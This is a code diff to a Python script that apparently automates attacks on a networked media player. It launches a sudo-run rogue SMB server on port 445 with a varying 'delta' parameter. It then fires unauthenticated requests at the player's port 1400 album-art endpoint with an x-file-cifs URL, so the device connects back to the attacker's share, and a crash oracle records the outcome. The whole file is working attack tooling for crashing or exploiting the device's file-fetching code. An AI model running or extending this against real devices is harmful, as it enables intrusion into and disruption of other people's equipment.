@@ -23,8 +23,17 @@ from datetime import datetime, timezone
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 ORACLE = os.path.join(HERE, "crash_oracle.py")
-HARNESS = os.path.join(HERE, "smb1.py")
-SHARE_HOST = "192.168.4.171"
+HARNESS = os.path.join(HERE, "smbserv_qinfo2.py")
+def _self_ip(host):
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect((host, 1400))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+
+
+SHARE_HOST = None
 
 
 def now():
@@ -40,13 +49,19 @@ def kill_445():
 def start_harness(delta):
     kill_445()
     env = dict(os.environ, FN_DELTA=delta)
-    subprocess.Popen(["sudo", "-n", "env", "FN_DELTA=" + delta, sys.executable, "-u", HARNESS, "445"],
+    py = os.environ.get("SMB_PY", "/private/tmp/fsonos-venv/bin/python")
+    subprocess.Popen(["sudo", "-n", py, "-u", HARNESS, "445", "32717", delta],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
-    time.sleep(2.0)
+    for _ in range(80):
+        r = subprocess.run("sudo -n lsof -ti :445", shell=True, capture_output=True, text=True)
+        if r.stdout.strip():
+            time.sleep(0.4)
+            return
+        time.sleep(0.1)
 
 
 def fire(host, timeout=25):
-    url = (f"http://{host}:1400/getaa?u=x-file-cifs://{SHARE_HOST}/S/x.jpg&w=64&h=64")
+    url = (f"http://{host}:1400/getaa?u=x-file-cifs://{SHARE_HOST}/S/real.jpg&w=64&h=64")
     t0 = time.monotonic()
     r = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                         "--max-time", str(timeout), url], capture_output=True, text=True)
@@ -84,7 +99,11 @@ def main():
     ap.add_argument("--settle", type=float, default=6.0,
                     help="seconds to keep watching after the request returns")
     ap.add_argument("--jsonl")
+    ap.add_argument("--share-host", default=None,
+                    help="address the player should call back (default: this host)")
     a = ap.parse_args()
+    global SHARE_HOST
+    SHARE_HOST = a.share_host or _self_ip(a.host)
 
     rows = []
     for d in [x.strip() for x in a.deltas.split(",") if x.strip()]:
